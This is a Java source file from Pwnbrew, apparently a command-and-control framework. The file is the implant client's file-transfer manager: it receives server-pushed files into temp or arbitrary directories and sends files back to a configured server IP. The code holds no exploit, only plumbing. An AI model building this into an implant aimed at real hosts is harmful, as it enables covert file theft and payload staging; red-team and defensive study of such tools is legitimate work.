/*

Copyright (C) 2013-2014, Securifera, Inc 

All rights reserved. 

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation 
	and/or other materials provided with the distribution.

    * Neither the name of Securifera, Inc nor the names of its contributors may be 
	used to endorse or promote products derived from this software without specific
	prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER 
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

================================================================================

Pwnbrew is provided under the 3-clause BSD license above.

The copyright on this package is held by Securifera, Inc

*/


/*
 *  FileMessageManager.java
 *
 *  Created on Jun 2, 2013
 */

package pwnbrew.network.file;

import java.io.File;
import java.io.IOException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import pwnbrew.ClientConfig;
import pwnbrew.concurrent.LockListener;
import pwnbrew.log.LoggableException;
import pwnbrew.manager.PortManager;
import pwnbrew.manager.DataManager;
import pwnbrew.misc.DebugPrinter;
import pwnbrew.misc.FileUtilities;
import pwnbrew.network.ClientPortRouter;
import pwnbrew.network.PortRouter;
import pwnbrew.network.control.ControlMessageManager;
import pwnbrew.network.control.messages.PushFile;
import pwnbrew.network.control.messages.PushFileAck;
import pwnbrew.selector.SocketChannelHandler;

/**
 *
 *  
 */
public class FileMessageManager extends DataManager implements LockListener {

    private static FileMessageManager theFileManager;
    private final Map<Integer, FileReceiver> theFileReceiverMap = new HashMap<>();
    private final Map<Integer, Map<Integer, FileSender>> theFileSenderMap = new HashMap<>();
    
    private static final String NAME_Class = FileMessageManager.class.getSimpleName();    
    private int lockVal = 0;
  
    //===========================================================================
    /*
     *  Constructor
     */
    private FileMessageManager( PortManager passedCommManager ) {
        
        super(passedCommManager); 
       
        FileHandler theFileHandler = new FileHandler( this );
        theFileHandler.start();
       
        //Set the data handler
        setDataHandler(theFileHandler);
    }  
    
    // ==========================================================================
    /**
     *   Creates the FileMessageManager
     * @param passedCommManager
     * @return 
     * @throws java.io.IOException 
     * @throws pwnbrew.log.LoggableException 
     */
    public synchronized static FileMessageManager initialize( PortManager passedCommManager ) throws IOException, LoggableException {

        if( theFileManager == null ) {
            theFileManager = new FileMessageManager( passedCommManager );
            createPortRouter( passedCommManager, ClientConfig.getConfig().getSocketPort(), true );
        }
        
        return theFileManager;

    }/* END instantiate() */
    
    // ==========================================================================
    /**
     *   Gets the FileMessageManager
     * @return 
     */
    public synchronized static FileMessageManager getFileMessageManager(){
        return theFileManager;
    }
    
    //===============================================================
    /**
     *   Send the message out the given channel.
     *
     * @param msgBytes
    */
    @Override
    public void handleMessage( PortRouter srcPortRouter, byte[] msgBytes ) {        
        theFileManager.getDataHandler().processData(srcPortRouter, msgBytes);        
    }
    
     //===========================================================================
    /*
     *  Returns the data handler
    */
    @Override
    public FileHandler getDataHandler() {
        return (FileHandler)theDataHandler;
    }  
    
    //===============================================================
    /**
    * Sets up for a file transfer
    *
    * @param fileToTransfer
    * @return
    */
    private void initFileTransfer( int passedSrcHostId, int passedTaskId, int passedFileId, File parentDir, String hashFilenameStr, long passedFileSize) 
            throws LoggableException, NoSuchAlgorithmException, IOException {

        //Get the socket router
        ClientConfig theConf = ClientConfig.getConfig();
        int socketPort = theConf.getSocketPort();
        String serverIp = theConf.getServerIp();
        ClientPortRouter aPR = (ClientPortRouter) theCommManager.getPortRouter( socketPort );
                       
        //Initiate the file transfer
        if(aPR != null){
            
            aPR.ensureConnectivity( serverIp, socketPort, this );       
            
            //Initialize the file transfer
            synchronized( theFileReceiverMap ){
                FileReceiver theReceiver = theFileReceiverMap.get(passedFileId);
                //If the receive flag is not set
                if( theReceiver == null ){

                    theReceiver = new FileReceiver( this, passedSrcHostId, passedTaskId, passedFileId, passedFileSize, parentDir, hashFilenameStr );
                    theFileReceiverMap.put(passedFileId, theReceiver);

                } else {
                    throw new LoggableException("A file receive is already in progress.");
                } 
            }
            
        }
        
    }
    
    //===========================================================================
    /**
     *  Get the file receiver
     * 
     * @param passedId
     * @return 
     */
    protected FileReceiver getFileReceiver( int passedId ){
        
        FileReceiver theReceiver;
        synchronized( theFileReceiverMap ){
            theReceiver = theFileReceiverMap.get( passedId );
        }
        return theReceiver;
    }

    //===========================================================================
    /**
     *  Removed the file receiver
     * 
     * @param fileId 
     */
    protected void removeFileReceiver(int fileId) {
        synchronized( theFileReceiverMap ){
            theFileReceiverMap.remove(fileId );
        }
    }
    
       //===============================================================
        /**
        * Prepares a file to be sent through a socket channel.
        * 
        * @param passedMessage
        * @return
        * @throws LoggableException 
     * @throws java.io.IOException 
    */
    public boolean prepFilePush( PushFile passedMessage ) throws LoggableException, IOException {

        boolean retVal = false;
        int taskId = passedMessage.getTaskId();
        int fileId = passedMessage.getFileId();
        int srcId = passedMessage.getSrcHostId();

        File libDir = null;
        int fileType = passedMessage.getFileType();
        switch(fileType){
            case PushFile.JOB_SUPPORT:
//                libDir = new File( Persistence.getDataPath(), Integer.toString(taskId) ); 
                libDir = FileUtilities.getTempDir();
                break;
            case PushFile.FILE_UPLOAD:
                libDir = new File( passedMessage.getRemoteDir() );
                break;
        }
                
        if( libDir != null ){
            
            //Get the control manager for sending messages
            ControlMessageManager aCMManager = ControlMessageManager.getControlMessageManager();
            if( aCMManager != null ){
                try {
                    //Get the hash/filename
                    String hashFileNameStr = passedMessage.getHashFilenameString();

                    //Try to begin the file transfer
                    initFileTransfer( srcId, taskId, fileId, libDir, hashFileNameStr, passedMessage.getFileSize() );

                    //Send an ack to the sender to begin transfer
                    DebugPrinter.printMessage(PortManager.class.getSimpleName(), "Sending ACK for " + hashFileNameStr);
                    PushFileAck aSFMA = new PushFileAck(taskId, fileId, hashFileNameStr);
                    aSFMA.setDestHostId( passedMessage.getSrcHostId() );
                    aCMManager.send(aSFMA);
                
                } catch ( IOException | NoSuchAlgorithmException  ex){
                    throw new LoggableException(ex);
                }
                retVal = true;
            }

        }

        return retVal;

    }
    
     //===============================================================
    /**
     *  Cleans up the work performed by the initFileTransfer function.
     * 
     * @param passedFileId
    */
    public void abortFileReceive( int passedFileId ) {
        
        FileReceiver theReceiver;
        synchronized( theFileReceiverMap ){
            theReceiver = theFileReceiverMap.remove(passedFileId );  
        }
        
        //Clean up
        if( theReceiver != null ){
            theReceiver.cleanupFileTransfer();
        }
          
    }

    //===============================================================
    /**
     *  Send the file referenced by the message.
     * 
     * @param aMessage 
     */
    public void sendFile(PushFileAck aMessage) {
        
        FileSender aSender = new FileSender( getCommManager(), aMessage );
        int taskId = aMessage.getTaskId();
        int fileId = aMessage.getFileId();
                
        synchronized( theFileSenderMap ){
            Map<Integer, FileSender> senderMap = theFileSenderMap.get(taskId);
            if( senderMap == null){
                senderMap = new HashMap<>();
                theFileSenderMap.put(taskId, senderMap);
            }            
            senderMap.put(fileId, aSender);
            
        }
        
        aSender.start();
        
    }

    //===============================================================
    /**
     *  Cancel any file transfers with the given taskId
     * 
     * @param taskId 
     */
    public void cancelFileTransfer(int taskId) {
        
        //Cancel file receives
        synchronized( theFileReceiverMap ){
            
            List<Integer> fileIds = new ArrayList<>(theFileReceiverMap.keySet());
            for( Integer anId : fileIds ){
                
                FileReceiver aReceiver = theFileReceiverMap.get(anId);
                int receiverId = aReceiver.getTaskId();
                if( receiverId == taskId ){
                    aReceiver.cleanupFileTransfer();
                    theFileReceiverMap.remove( anId );
                }
                
            }
        }
        
        //Cancel file sends
        synchronized( theFileSenderMap ){
            
            List<Integer> taskIds = new ArrayList<>(theFileSenderMap.keySet());
            for( Integer aTaskId : taskIds ){
                
                Map<Integer, FileSender> aSenderMap = theFileSenderMap.get(aTaskId);
                List<Integer> aFileId = new ArrayList<>(aSenderMap.keySet());
                for( Integer anId : aFileId ){
                    FileSender aSender = aSenderMap.get(anId);
                    aSender.shutdown();
                    aSenderMap.remove( anId );
                }
                
                //Remove from the map
                theFileSenderMap.remove(aTaskId);
            }
        }
        
        //Clear the send buffer
        PortRouter aPR = theCommManager.getPortRouter( ClientConfig.getConfig().getSocketPort() );
        SocketChannelHandler aSCH = aPR.getSocketChannelHandler();

        //Set the wrapper
        if( aSCH != null ){
            aSCH.clearQueue();
        }    
        
        
    }
    
     //===============================================================
    /**
     * 
     * @param lockOp 
     */
    @Override
    public synchronized void lockUpdate(int lockOp) {
        lockVal = lockOp;
        notifyAll();
    }
    
    //===============================================================
    /**
     * 
     * @return  
     */
    @Override
    public synchronized int waitForLock() {
        
        int retVal;        
        while( lockVal == 0 ){
            try {
                wait();
            } catch (InterruptedException ex) {
                break;
            }
        }
        
        //Set to temp and reset
        retVal = lockVal;
        lockVal = 0;
        
        return retVal;
    }
    
}
